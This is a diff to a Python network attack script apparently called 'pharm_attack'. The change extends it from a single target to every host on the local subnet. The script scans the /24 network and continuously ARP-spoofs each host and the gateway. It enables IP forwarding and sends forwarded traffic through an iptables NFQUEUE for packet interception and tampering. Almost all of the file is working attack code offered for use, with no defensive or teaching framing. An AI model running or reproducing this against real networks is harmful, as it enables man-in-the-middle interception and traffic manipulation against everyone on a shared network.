@@ -50,26 +50,28 @@ def main():
 		print("Try sudo ./pharm_attack")
 		return
 	route_default_result = re.findall(r"([\w.][\w.]*'?\w?)", subprocess.check_output(["ip", "route"]))
-	default_gateway = route_default_result[2] + '/24'
 	#default_interface = route_default_result[4]
 
-	res = scan(default_gateway)
-	print("IP\t\t\tMAC Address\n-----------------------------------------")
-	for client in res[1:]:
-		print(client["ip"] + "\t\t" + client["mac"])
-	gateway = res[0]
-	victim = res[-1]
+	default_gateway = route_default_result[2]
+	gateway = scan(default_gateway)[0]
+	domain = default_gateway + '/24'
+	victims = scan(domain)
+	
 	print("\t IP\t\t\tMAC Address\n-----------------------------------------")
 	print('Gateway: ' + gateway["ip"] + "\t\t" + gateway["mac"])
-	print('Victim : ' + victim["ip"] + "\t\t" + victim["mac"])
+	for victim in victims:
+		if victim != gateway:
+			print('Victim : ' + victim["ip"] + "\t\t" + victim["mac"])
 
 	subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])
 	try:
 		enable_ip_forward()
 		print("[*] ARP spoofing...")
 		while True:
-			spoofing(victim,gateway) # tell victim we are router
-			spoofing(gateway,victim) # tell router we are victim
+			for victim in victims:
+				if victim != gateway:
+					spoofing(victim,gateway) # tell victim we are router
+					spoofing(gateway,victim) # tell router we are victim
 			print("[*] Packet intercepting...")
 			nfqueue = netfilterqueue.NetfilterQueue()
 			nfqueue.bind(0,proc_of_pkt)
@@ -78,8 +80,10 @@ def main():
 	except KeyboardInterrupt:
 		print("\n[!] Stop Packet intercepting.")
 		print("[!] ARP spoofing is terminated, restoring ARP table")
-		restore(victim,gateway)
-		restore(gateway,victim)
+		for victim in victims:
+			if victim != gateway:
+				restore(victim,gateway)
+				restore(gateway,victim)
 		print("[*] Sucessfully restoring ARP table")
 	subprocess.call(["iptables","--flush"])
 
